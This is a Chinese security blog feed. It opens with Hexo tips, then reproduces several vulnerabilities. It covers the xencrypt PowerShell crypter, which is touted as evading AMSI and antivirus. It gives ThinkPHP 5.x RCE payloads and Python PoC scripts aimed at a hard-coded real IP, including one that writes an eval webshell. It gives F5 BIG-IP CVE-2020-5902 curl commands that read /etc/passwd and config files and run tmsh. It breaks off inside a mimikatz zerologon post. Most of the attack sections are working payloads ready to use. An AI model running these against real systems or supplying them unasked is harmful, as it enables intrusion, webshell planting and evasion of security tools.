<h2 id="文章加密"><a href="#文章加密" class="headerlink" title="文章加密"></a>文章加密</h2><p>打开<code>themes-&gt;next-&gt;layout-&gt;_partials-&gt;head.swig</code>文件,在以下位置插入这样一段代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, maximum-scale=2&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;theme-color&quot;</span> content=<span class="string">&quot;&#123;&#123; theme.android_chrome_color &#125;&#125;&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;&#123;&#123; page.password &#125;&#125;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (prompt(<span class="string">&#x27;请输入文章密码&#x27;</span>) !== <span class="string">&#x27;&#123;&#123; page.password &#125;&#125;&#x27;</span>)&#123;</span><br><span class="line">                alert(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">                history.back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>之后在所有的需要加密文章的头部信息中添加<code>password: 123456</code>即可使用密码加密。</p>
<h2 id="文章图片处理"><a href="#文章图片处理" class="headerlink" title="文章图片处理"></a>文章图片处理</h2><p>图片路径问题，<code>hexo new post &quot;文章名&quot;</code>会在同目录下生辰同名文件夹用来存放图片。使用图片是直接文件名即可。</p>
<ul>
<li><code>npm install hexo-asset-image --save</code></li>
<li>配置文件 post_asset_folder，把这个选项从false改成true</li>
<li><code>/Users/lnx/Desktop/blog/node_modules/hexo-asset-image/index.js</code>修改为如下</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> cheerio = <span class="built_in">require</span>(<span class="string">&#x27;cheerio&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPosition</span>(<span class="params">str, m, i</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.split(m, i).join(m).length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> version = <span class="built_in">String</span>(hexo.version).split(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">hexo.extend.filter.register(<span class="string">&#x27;after_post_render&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> config = hexo.config;</span><br><span class="line">  <span class="keyword">if</span>(config.post_asset_folder)&#123;</span><br><span class="line">        <span class="keyword">var</span> link = data.permalink;</span><br><span class="line">    <span class="keyword">if</span>(version.length &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">Number</span>(version[<span class="number">0</span>]) == <span class="number">3</span>)</span><br><span class="line">       <span class="keyword">var</span> beginPos = getPosition(link, <span class="string">&#x27;/&#x27;</span>, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">var</span> beginPos = getPosition(link, <span class="string">&#x27;/&#x27;</span>, <span class="number">3</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span></span><br><span class="line">    <span class="keyword">var</span> endPos = link.lastIndexOf(<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">    link = link.substring(beginPos, endPos);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toprocess = [<span class="string">&#x27;excerpt&#x27;</span>, <span class="string">&#x27;more&#x27;</span>, <span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; toprocess.length; i++)&#123;</span><br><span class="line">      <span class="keyword">var</span> key = toprocess[i];</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">var</span> $ = cheerio.load(data[key], &#123;</span><br><span class="line">        ignoreWhitespace: <span class="literal">false</span>,</span><br><span class="line">        xmlMode: <span class="literal">false</span>,</span><br><span class="line">        lowerCaseTags: <span class="literal">false</span>,</span><br><span class="line">        decodeEntities: <span class="literal">false</span></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      $(<span class="string">&#x27;img&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>))&#123;</span><br><span class="line">            <span class="comment">// For windows style path, we replace &#x27;\&#x27; to &#x27;/&#x27;.</span></span><br><span class="line">            <span class="keyword">var</span> src = $(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>).replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="regexp">/http[s]*.*|\/\/.*/</span>.test(src) &amp;&amp;</span><br><span class="line">               !<span class="regexp">/^\s*\//</span>.test(src)) &#123;</span><br><span class="line">              <span class="comment">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span></span><br><span class="line">              <span class="comment">// In addition, to support multi-level local directory.</span></span><br><span class="line">              <span class="keyword">var</span> linkArray = link.split(<span class="string">&#x27;/&#x27;</span>).filter(<span class="function"><span class="keyword">function</span>(<span class="params">elem</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">              &#125;);</span><br><span class="line">              <span class="keyword">var</span> srcArray = src.split(<span class="string">&#x27;/&#x27;</span>).filter(<span class="function"><span class="keyword">function</span>(<span class="params">elem</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span> &amp;&amp; elem != <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">              &#125;);</span><br><span class="line">              <span class="keyword">if</span>(srcArray.length &gt; <span class="number">1</span>)</span><br><span class="line">                srcArray.shift();</span><br><span class="line">              src = srcArray.join(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">              $(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>, config.root + link + src);</span><br><span class="line">              <span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info(<span class="string">&quot;update link as:--&gt;&quot;</span>+config.root + link + src);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info(<span class="string">&quot;no src attr, skipped...&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info($(<span class="built_in">this</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      data[key] = $.html();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之后即可出采用<code>![描述](1.png)</code></p>
]]></content>
      <categories>
        <category>知识整理</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>博客搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>PowerShell免杀工具 xencrypt</title>
    <url>/posts/bbc4e121/</url>
    <content><![CDATA[<p>在微信号<code>洛米唯熊</code>看到发了一篇文章，关于免杀的，于是测试了一下。非常Nice。</p>
<a id="more"></a>

<h1 id="PowerShell免杀工具-xencrypt"><a href="#PowerShell免杀工具-xencrypt" class="headerlink" title="PowerShell免杀工具 xencrypt"></a>PowerShell免杀工具 xencrypt</h1><p>在微信号<code>洛米唯熊</code>看到发了一篇文章，关于免杀的，于是测试了一下。</p>
<ul>
<li>地址：<ul>
<li>公众号：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvTG1yRU1sQTZ4VkxncldIUmYtY25JQQ==">https://mp.weixin.qq.com/s/LmrEMlA6xVLgrWHRf-cnIA<i class="fa fa-external-link-alt"></i></span></li>
<li>GIitHub：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZS14ZW50cm9weS94ZW5jcnlwdA==">https://github.com/the-xentropy/xencrypt<i class="fa fa-external-link-alt"></i></span></li>
<li>作者：<span class="exturl" data-url="aHR0cHM6Ly9uZXRzZWMuZXhwZXJ0LzIwMjAvMDIvMDYvd3JpdGUtYS1jcnlwdGVyLWluLWFueS1sYW5ndWFnZS5odG1s">https://netsec.expert/2020/02/06/write-a-crypter-in-any-language.html<i class="fa fa-external-link-alt"></i></span></li>
</ul>
</li>
</ul>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>测试文件为sherklock.ps1。</p>
<h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><ul>
<li>绕过VirusTotal上使用的AMSI和所有现代AV（截至撰写时）</li>
<li>压缩和加密Powershell脚本</li>
<li>开销极小，而且通常为负（由于压缩）</li>
<li>随机化变量名称，以进一步模糊解密程序存根</li>
<li>随机化加密，压缩甚至语句在代码中出现的顺序，以最大程度地提高熵！</li>
<li>超级容易修改以创建自己的加密程序变体</li>
<li>支持递归分层（加密器对加密的输出进行加密），最多测试500层。</li>
<li>只要输入脚本也支持Import-Module以及标准运行</li>
<li>GPLv3-免费和开源！</li>
<li>所有功能都在一个文件中，因此您可以随身携带它！</li>
<li>尽管上述所有内容都不是每种配置的灵丹妙药-警告购买者！</li>
</ul>
<p>谷歌翻译而来。。。</p>
<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>使用AES，但是我之所以选择它，并不是因为AES在加密方面比其他方法更好，而是因为PowerShell提供了一种非常简单的方法来调用.NET函数。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$aes</span>.BlockSize = <span class="number">128</span></span><br><span class="line"><span class="variable">$aes</span>.Mode = [<span class="type">System.Security.Cryptography.CipherMode</span>]::ECB</span><br><span class="line"><span class="variable">$aes</span>.Padding = [<span class="type">System.Security.Cryptography.PaddingMode</span>]::Zeros</span><br><span class="line"><span class="variable">$aes</span>.KeySize = <span class="number">128</span></span><br><span class="line"><span class="variable">$aes</span>.Key = <span class="variable">$key</span></span><br><span class="line"><span class="variable">$aes</span>.IV = <span class="variable">$payload</span>[<span class="number">0</span><span class="type">..15</span>]</span><br><span class="line"><span class="variable">$memstream</span> = <span class="built_in">New-Object</span> System.IO.MemoryStream(,<span class="variable">$aes</span>.CreateDecryptor().TransformFinalBlock(<span class="variable">$payload</span>,<span class="number">16</span>,<span class="variable">$payload</span>.Length<span class="literal">-16</span>))</span><br></pre></td></tr></table></figure>

<p>我之所以选择这种方法，是因为防病毒软件检测恶意软件的主要方法之一是通过静态规则。他们挑选出文件中的字节序列或字符串，并制定合并的规则，很好地表明文件是一种特定类型的恶意软件。通过使用标准的API调用而不做任何自定义操作，针对此加密器的规则将不得不依靠标记普通的API调用，这可能会导致大量误报，并且分析人员似乎根据我的研究试图避免这种情况。在这里，如何选择算法尚无确定的“科学”，因此请按照自己的逻辑和想法行事，但是这种思路目前对我而言仍然有意义，因此这是我的选择。</p>
<p>在此基础上，如果您对非常具体的加密和解密算法进行硬编码，则很可能仅通过将特定的加密和解密例程标记为存根的“签名”，他们就能获得非常低的误报率。这是一种非常懒惰的方式，但是它可以工作并且对特定版本的恶意软件非常有效。克服此限制的一种方法是动态生成加密和解密算法，或者至少手动更改它，但这超出了本文的范围。</p>
<h3 id="执行方式"><a href="#执行方式" class="headerlink" title="执行方式"></a>执行方式</h3><p>就我而言，我想制作一个PowerShell密码器，可以无限期地对其自身进行分层，以进一步绕过动态AV（我对其进行了多达500层的测试），因此<code>Invoke-Expression</code>很自然，因为它既可以返回也可以执行字符串值。最终，您选择的内容无关紧要，仅改变您必须准备的有效载荷的方式。</p>
<p>。。。。</p>
<p>详情请参考原文链接，因为我不太懂：<span class="exturl" data-url="aHR0cHM6Ly9uZXRzZWMuZXhwZXJ0LzIwMjAvMDIvMDYvd3JpdGUtYS1jcnlwdGVyLWluLWFueS1sYW5ndWFnZS5odG1s">https://netsec.expert/2020/02/06/write-a-crypter-in-any-language.html<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><ul>
<li>首先下载到本地：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/the-xentropy/xencrypt.git</span><br></pre></td></tr></table></figure>

<ul>
<li>关闭电脑杀毒软件</li>
<li>切换到文件夹中,导入模块使用即可。（ -iterations N 指定压缩和加密次数）</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> xencrupt.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Xencrypt</span> <span class="literal">-infile</span> C:\Users\windows\Desktop\sherlock.ps1 <span class="literal">-outfile</span> sherk.ps1 <span class="literal">-iterations</span> <span class="number">11</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>工具</tag>
        <tag>PowerShell</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP 5.x 远程代码执行</title>
    <url>/posts/8724785f/</url>
    <content><![CDATA[<p>ThinkPHP 5.x版本是官方于2015年发布的新一代框架，其中5.0版本于2016年的9月份布。ThinkPHP 5.x版本曝出多个远程代码执行漏洞。</p>
<a id="more"></a>

<h1 id="ThinkPHP-5-x-代码执行"><a href="#ThinkPHP-5-x-代码执行" class="headerlink" title="ThinkPHP 5.x 代码执行"></a>ThinkPHP 5.x 代码执行</h1><ul>
<li>GET：框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞。</li>
<li>POST：本次漏洞触发点在Request.php文件里的method方法中，该方法的功能主要是判断请求类型。</li>
</ul>
<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p>目前漏洞影响版本号包括：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">5.</span>x &lt; <span class="number">5.1</span><span class="number">.31</span>, &lt;= <span class="number">5.0</span><span class="number">.23</span></span><br></pre></td></tr></table></figure>

<h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>目前漏洞影响版本号包括：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">5.</span>x &lt;= <span class="number">5.0</span><span class="number">.23</span></span><br></pre></td></tr></table></figure>

<p>以下基于ThinkPHP 5 二次开发的内容管理系统，很可能受到该漏洞影响，建议厂商及时更新。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">AdminLTE后台管理系统</span><br><span class="line">layui后台管理系统</span><br><span class="line">thinkcmf</span><br><span class="line">H-ui.admin后台管理系统</span><br><span class="line">tpshop</span><br><span class="line">FsatAdmin</span><br><span class="line">eyoucms</span><br><span class="line">LarryCMS后台管理系统</span><br><span class="line">tpadmin后台管理系统</span><br><span class="line">snake后台管理系统</span><br><span class="line">ThinkSNS</span><br><span class="line">DolphinPHP后台管理系统</span><br><span class="line">WeMall商城系统</span><br><span class="line">CLTPHP</span><br><span class="line">齐博CMS</span><br><span class="line">DSMALL</span><br><span class="line">YFCMF</span><br><span class="line">HisiPHP后台管理系统</span><br><span class="line">Tplay后台管理系统</span><br><span class="line">lyadmin后台管理系统</span><br><span class="line">haoid后台管理系统</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>GET和POST方式为两种不同的代码执行漏洞。</p>
<h3 id="POC-Get方式"><a href="#POC-Get方式" class="headerlink" title="POC Get方式"></a>POC Get方式</h3><ul>
<li>ThinkPHP5-RCE Version: 5.0.20/5.1.29/5.0.21/5.0.22/</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line">index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">url</span>):</span>  <span class="comment"># 验证 是否存在</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url <span class="keyword">and</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = <span class="string">&#x27;http://&#x27;</span> + url</span><br><span class="line">    poc1 = <span class="string">&#x27;/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1&#x27;</span></span><br><span class="line">    poc2 = <span class="string">&#x27;/index.php?s=index/\\think\\app/invokefunction&amp;function=phpinfo&amp;vars[0]=100&#x27;</span></span><br><span class="line">    cmd = <span class="string">&#x27;/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami&#x27;</span></span><br><span class="line">    shell = <span class="string">&#x27;/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=&lt;?php @eval($_POST[c]);?&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url+poc1)</span><br><span class="line">        <span class="keyword">if</span> response.status_code ==<span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;SERVER_NAME&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;PayLoad : \n&#123;0&#125;\n&#123;1&#125;\n&#123;2&#125;\n&#123;3&#125;&#x27;</span>.format(poc1,poc2,cmd,shell)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            response = requests.get(url+poc2)</span><br><span class="line">            <span class="keyword">if</span> response.status_code ==<span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;SERVER_NAME&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;PayLoad : \n&#123;0&#125;\n&#123;1&#125;\n&#123;2&#125;&#x27;</span>.format(poc2,cmd,shell)</span><br><span class="line">            <span class="keyword">else</span>:<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">str</span>):</span> <span class="comment">#攻击模块</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">c = poc(<span class="string">&#x27;https://39.105.137.230/&#x27;</span>)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>

<h3 id="POC-POST方式"><a href="#POC-POST方式" class="headerlink" title="POC POST方式"></a>POC POST方式</h3><ul>
<li>5.x &lt;= 5.0.23</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST data:</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">url</span>):</span>  <span class="comment"># 验证 是否存在</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url <span class="keyword">and</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = <span class="string">&#x27;http://&#x27;</span> + url + <span class="string">&#x27;/index.php?s=captcha&#x27;</span></span><br><span class="line">    data = <span class="string">&#x27;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo 44899742450bdb319a869ed7438a61c6&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0(X11;Linuxx86_64;rv:67.0)Gecko/20100101 Firefox/67.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip,deflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080//index.php?s=captcha0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;JSESSIONID=F7494C874B4E613FB6E023109349554A&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Forwarded-For&quot;</span>:<span class="string">&quot;192.168.201.21&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    url = url + <span class="string">&#x27;/index.php?s=captcha&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span>  response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;44899742450bdb319a869ed7438a61c6&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;存在ThinkPHP5-RCE&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">str</span>):</span> <span class="comment">#攻击模块</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line">s = poc(url)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>

<p>具体的版本已实际测试为准。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>ThinkPHP</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>cve-2020-5902 BIG-IP RCE漏洞复现</title>
    <url>/posts/714a2891/</url>
    <content><![CDATA[<p>攻击者利用该漏洞，构造恶意请求，在未授权的情况下通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 F5 BIG-IP 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。</p>
<a id="more"></a>

<ul>
<li>原文地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcG90YXRzb1NlYy9wLzEzMjUzMjg4Lmh0bWw=">https://www.cnblogs.com/potatsoSec/p/13253288.html<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>在F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。2020年7月1日，F5官方公布流量管理用户界面（TMUI）存在 前台远程执行代码（RCE）漏洞（CVE-2020-5902）。</p>
<h2 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h2><p>版本号主要如下：</p>
<ul>
<li>BIG-IP 15.x: &lt; 15.1.0.3</li>
<li>BIG-IP 14.x: &lt; 14.1.2</li>
<li>BIG-IP 13.x: &lt; 13.1.3</li>
<li>BIG-IP 12.x: &lt; 12.1.5</li>
<li>BIG-IP 11.x: &lt; 11.6.5</li>
</ul>
<h2 id="0x03-POC"><a href="#0x03-POC" class="headerlink" title="0x03 POC"></a>0x03 POC</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v -k  <span class="string">&#x27;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line">https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</span><br><span class="line"></span><br><span class="line">https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts</span><br><span class="line"></span><br><span class="line">https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license</span><br><span class="line"></span><br><span class="line">https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf</span><br></pre></td></tr></table></figure>

<p><img src="/posts/714a2891/imgRead_File.png"></p>
<h2 id="0x04-RCE"><a href="#0x04-RCE" class="headerlink" title="0x04 RCE"></a>0x04 RCE</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v -k  <span class="string">&#x27;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/714a2891/imgRCE.png"></p>
<h2 id="0x05-修复方法"><a href="#0x05-修复方法" class="headerlink" title="0x05 修复方法"></a>0x05 修复方法</h2><p>升级<br> 11.6.5.2, 12.1.5.2, 13.1.3.4, 14.1.2.6, 15.1.0.4</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>eve-2020-5902</tag>
      </tags>
  </entry>
  <entry>
    <title>mimikatz利用zerologon攻击域控服务器相关命令（附蓝队自查方案)</title>
    <url>/posts/f4b8e3a6/</url>
    <content><![CDATA[<p>监测到国外安全厂商发布了NetLogon  权限提升漏洞（CVE-2020-1472）的详细技术分析文章和验证脚本。此漏洞是微软8月份发布安全公告披露的紧急漏洞，漏洞评分10分，漏洞利用后果严重，未经身份认证的攻击者可通过使用 Netlogon 远程协议（MS-NRPC）连接域控制器来利用此漏洞。成功利用此漏洞的攻击者可获得域管理员访问权限。</p>
<a id="more"></a>

<ul>
<li>原文地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcG90YXRzb1NlYy9wLzEzNzEwOTQ3Lmh0bWw=">https://www.cnblogs.com/potatsoSec/p/13710947.html<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>mimikatz 20200918版本支持通过zerologon漏洞攻击域控服务器。</p>
<ul>
<li>下载链接：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kvbWltaWthdHovcmVsZWFzZXMvdGFnLzIuMi4wLTIwMjAwOTE4LWZpeA==">Github地址<i class="fa fa-external-link-alt"></i></span></li>
<li>本站下载地址：<a href="mimikatz_trunk.7z">本站下载</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl md5  mimikatz_trunk.7z</span><br><span class="line">MD5(mimikatz_trunk.7z)= a0d09c0170c224d89cfa49ba6634630f</span><br></pre></td></tr></table></figure>

<p><img src="/posts/f4b8e3a6/img93626780-37aa7880-f9e4-11ea-9b13-09fbd74f9b7b.png" alt="img"></p>
<h2 id="0x02-利用方式"><a href="#0x02-利用方式" class="headerlink" title="0x02 利用方式"></a>0x02 利用方式</h2><ol>
<li><code>lsadump::zerologon /target:dc.hacke.testlab /account:dc$  </code>poc</li>
